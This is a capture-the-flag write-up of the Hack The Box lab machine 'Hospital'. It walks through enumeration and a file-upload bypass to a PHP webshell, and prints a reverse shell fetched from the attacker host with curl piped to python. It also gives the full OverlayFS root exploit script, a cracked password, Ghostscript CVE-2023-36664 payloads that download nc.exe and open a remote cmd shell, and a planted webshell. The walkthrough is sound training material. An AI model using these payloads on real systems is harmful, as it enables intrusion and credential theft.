---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Hospital

## Enumeraton

### nmap

Let's start with quick and simple scan

```
nmap -p- -v hospital.htb -Pn

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
6070/tcp open  messageasap
6404/tcp open  boe-filesvr
6406/tcp open  boe-processsvr
6407/tcp open  boe-resssvr1
6409/tcp open  boe-resssvr3
6612/tcp open  unknown
6636/tcp open  mpls-udp-dtls
8080/tcp open  http-proxy
9389/tcp open  adws
```

That is a lot of ports. Let's drill down a bit. Flag grabbing: `-sC -sV`

```
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-21 00:27:03Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail : Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
|_SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-21T00:27:58+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6070/tcp open  msrpc             Microsoft Windows RPC
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6612/tcp open  msrpc             Microsoft Windows RPC
6636/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Hosts: DC, www.example.com; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time: 
|   date: 2023-11-21T00:28:00
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Initiating NSE at 17:28
Completed NSE at 17:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.08 seconds
```

### DNS

```
└─$ dig any hospital.htb @10.129.166.232

; <<>> DiG 9.19.17-1-Debian <<>> any hospital.htb @10.129.166.232
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22304
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 5

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;hospital.htb.                  IN      ANY

;; ANSWER SECTION:
hospital.htb.           600     IN      A       192.168.5.1
hospital.htb.           600     IN      A       10.129.166.232
hospital.htb.           3600    IN      NS      dc.hospital.htb.
hospital.htb.           3600    IN      SOA     dc.hospital.htb. hostmaster.hospital.htb. 521 900 600 86400 3600
hospital.htb.           600     IN      AAAA    dead:beef: 157
hospital.htb.           600     IN      AAAA    dead:beef: 2e6e:d04c:d218:c8d

;; ADDITIONAL SECTION:
dc.hospital.htb.        3600    IN      A       192.168.5.1
dc.hospital.htb.        3600    IN      A       10.129.166.232
dc.hospital.htb.        3600    IN      AAAA    dead:beef: 157
dc.hospital.htb.        3600    IN      AAAA    dead:beef: 2e6e:d04c:d218:c8d

;; Query time: 32 msec
;; SERVER: 10.129.166.232#53(10.129.166.232) (TCP)
;; WHEN: Mon Nov 20 12:29:29 EST 2023
;; MSG SIZE  rcvd: 281
```

As expected, there are the following domain names.

* hospital.htb
* dc.hospital.htb However, there is a strange, unexpected A record (192.168.5.1). Maybe docker or VM?

### Web: subdomains

ffuf did not find any on 8080 and 443

### Web (8080): directory scan

Gobuster

```
/images               (Status: 301) [Size: 320] [--> http://hospital.htb:8080/images/]
/uploads              (Status: 301) [Size: 321] [--> http://hospital.htb:8080/uploads/]
/css                  (Status: 301) [Size: 317] [--> http://hospital.htb:8080/css/]
/js                   (Status: 301) [Size: 316] [--> http://hospital.htb:8080/js/]
/vendor               (Status: 301) [Size: 320] [--> http://hospital.htb:8080/vendor/]
/fonts                (Status: 301) [Size: 319] [--> http://hospital.htb:8080/fonts/]
```

### Web (443): directory scan

```
/installer            (Status: 301) [Size: 343] [--> https://hospital.htb/installer/]
```

## Web (443)

There is a login screen. Visitng `https://hospital.htb/installer` reveal that there is a roundcube installation (mailer) and PHP. Default creds did not work, and the installation steps were followed (you can't access `/config`, `/logs`, etc...)

## Web (8080)

Again a login screen, but this time, we can register. After registration and loging in, there is a form with file upload.

### File Upload

There must be some filtering, `.php` doesn't upload. Same content but with `.txt` succeedes. The file is then accessible at `/uploads/<filename>`. After a short while, the file gets deleted.

Let's try to upload a PHP file, that is not with `.php` extension, but can be executed anyways. A simple phpinfo printing is enough for now.

```
<?php
phpinfo();
?>
```

Useful hacktricks article: https://book.hacktricks.xyz/pentesting-web/file-upload TIP: Use burp repeater to speedup the process (you can specify the extension there) After trying some extensions, we find out that `.phar` works.

We can also see from phpinfo that there are some disables functions

```
pcntl_alarm
pcntl_fork
pcntl_waitpid
pcntl_wait
pcntl_wifexited
pcntl_wifstopped
pcntl_wifsignaled
pcntl_wifcontinued
pcntl_wexitstatus
pcntl_wtermsig
pcntl_wstopsig
pcntl_signal
pcntl_signal_get_handler
pcntl_signal_dispatch
pcntl_get_last_error
pcntl_strerror
pcntl_sigprocmask
pcntl_sigwaitinfo
pcntl_sigtimedwait
pcntl_exec
pcntl_getpriority
pcntl_setpriority
pcntl_async_signals
pcntl_unshare
system
shell_exec
exec
proc_open
preg_replace
passthru
curl_exec
```

### PHP Shell: Only traversal

The common shell from pentestmonkey does not work (due to the disabled functions). Let's try a different one. https://github.com/drag0s/php-webshell/blob/master/webshell.php Does not allow for execution, but at least the directory traversal.

#### Database

Database connetion settings

```
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
```

We can utilise the abbility to upload PHP to read the database.

```PHP
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
$sql = "SELECT * FROM users";

// Execute the query
$result = mysqli_query($link, $sql);
if ($result) {
    // Check if there are rows in the result set
    if (mysqli_num_rows($result) > 0) {
        // Output data of each row
        while ($row = mysqli_fetch_assoc($result)) {
            print_r($row); // You can customize this output based on your needs
            echo "\n";
        }
    } else {
        echo "No records found";
    }

    // Free result set
    mysqli_free_result($result);
} else {
    echo "ERROR: Could not execute $sql. " . mysqli_error($link);
}

// Close connection
mysqli_close($link);
?>
```

There seems to be only one table with users, containing:

```
Array ( [id] => 1 [username] => admin [password] => $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 [created_at] => 2023-09-21 14:46:04 )
Array ( [id] => 2 [username] => patient [password] => $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO [created_at] => 2023-09-21 15:35:11 )
Array ( [id] => 3 [username] => adminadmin [password] => $2y$10$vHp2BwawCw95VI.Ve.d95eAoIJCFPHoPNumA2urJh6cUPtwqFdYF. [created_at] => 2023-11-21 00:54:01 )
Array ( [id] => 4 [username] => puh [password] => $2y$10$fZRNgmfRebvH2RneIJHoFu84Owbmb.hfx/K.iknfJDucwYjMEL.tu [created_at] => 2023-11-21 00:54:22 )
Array ( [id] => 5 [username] => ola [password] => $2y$10$L0Y.WsCiElQ6yDhqu.RVP.PN3tLXtE8GuUeLgsZxzL3NECO70qu2e [created_at] => 2023-11-21 00:55:07 )
Array ( [id] => 6 [username] => dart [password] => $2y$10$.sDcpS7j8cPeQyqTG/s//eghR0QY0Uztb9ofIwRsa/lk4m2W58ZsO [created_at] => 2023-11-21 01:01:44 )
Array ( [id] => 7 [username] => testi [password] => $2y$10$Lcj665e7ve4PIJe606nUDu2/ONX9K.1tEG0mQIrVaibzoWBfE70qe [created_at] => 2023-11-21 01:02:12 )
Array ( [id] => 8 [username] => testing [password] => $2y$10$FtUmpM/FyJGGMOLHy27.MO3v7wWhNuyfWCR2PFFoSYriyrxlFDJIe [created_at] => 2023-11-21 01:07:17 )
Array ( [id] => 9 [username] => test [password] => $2y$10$5/3AvOM0gYOtfGZ2dyCay.e.3An0n6zZKwDgoYpSn6cRXNhBH2loK [created_at] => 2023-11-21 01:08:44 )
Array ( [id] => 10 [username] => jim [password] => $2y$10$7zsczypPHUydXX7cw3sa8eLdAhm3.u0gpQvR56Y4btvwU7eJIekVa [created_at] => 2023-11-21 01:11:02 )
Array ( [id] => 11 [username] => bob [password] => $2y$10$jPiniiz35c33VNFmAY30VuHkqBr78jLCu00ZhsV1OPl1k3Ws597nO [created_at] => 2023-11-21 01:14:30 )
Array ( [id] => 12 [username] => test1 [password] => $2y$10$ricX1hCrRfSSJAys6XuNf.Y4qZESmKxCFNyyLsI07eELrZuZnqYOe [created_at] => 2023-11-21 01:19:19 )
```

Which are only the registered users to the app, so that leads nowhere.

### PHP Shell: Full Capabilities

By comparing the disabled functions with hte list of PHP "dangerous functions", we can spot that `popen` is missed. Let's try this shell, which is amazing: `https://github.com/flozz/p0wny-shell/blob/master/shell.php`

But let's use it to get a nice TTY shell.

```bash
# Setup webserver to get the shell (port 8000)
# Run the handler
python2 handler.py -b 10.10.14.92:8888
# Run the reverse shell
curl 10.10.14.92:8000/shell.py|python3
```

## Linux machine

So, we are inside a linux machine as `www-data`. By enumerating the hardware, we can see that we are really in VM (poiting out to the A Record). It can be seen here:

```
lshw | grep product
```

By checking the kernel version

```
uname : r
```

we can see that it might be vulnerable to OverlayFS exploint (oh no, not again)

And really, it is https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

```
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

So we have the root. But that is not the machine. There is a `drwilliams` user, but no flag yet.

However, as a root, we have access to `/etc/shadow`!!! And really, there is a password hash, so let's crack it

```
# hashcat -m 1800 hash rockyou.txt -O

$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

Let's try the credentials in the Roundcube mail app (that is not deployed on the VM). And it works!

## Roundcube

Using `drwilliams:qwe123!@#` we can log in to the application. There there is one email in inbox mentioning sending **.eps** file so that it can be executed in **ghostscript**. After some googling, there is a new (2023) CVE. https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

The PoC allow to create an eps file with an embedded command. However, to spawn the remote shell more easier, we would need `nc.exe` binary. Luckily it is embedded in kali `/usr/share/windows-binaries/nc.exe` (so we don't have to download anything).

The payload are created as follows:

```bash
# download nc.exe
python3 CVE_2023_36664_exploit.py --generate --payload "curl 10.10.14.92:8000/nc.exe -o nc.exe" --filename first --extension eps
# execute shell
python3 CVE_2023_36664_exploit.py --generate --payload "nc.exe -e cmd.exe 10.10.14.92 6666" --filename second --extension eps
```

Fire up the webserver to download the `nc.exe` and shell listener and wait.

Now, send the files one by one as a reply to the email (hopefully, the other doctor will run it through ghostscript).

They did! We got a shell and user flag!

```
# type is an equivalent to cat in cmd
type user.txt
```

## Windows Machine (-> ~~Root~~ Administrator)

Let's run winpeas first and see what we'll get. It might be a good idea to save the output to a file and exfiltrate it.

From the huge amout of data, we can see several things. E.g.,:

```
Apache2.4(Apache Software Foundation - Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Autoload
Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
```

This is pointing to XAMMP, which is environment for running PHP on windows (that makes sense, given the application).

By inspecting the folder, one thing stands out. We have write priviledge to `C:\xampp\htdocs` which is the folder where the Roundcube is deployed (it is missconfigured after all).

Given that XAMMP has to run under system account, we can just upload a php with web shell.

So, we just upload the PHP shell again.

```
# https://github.com/flozz/p0wny-shell/blob/master/shell.php
curl 10.10.14.92:8000/shell.php -o shell.php
```

Now, we can access it on `https://hospital.htb/shell.php` and get the flag.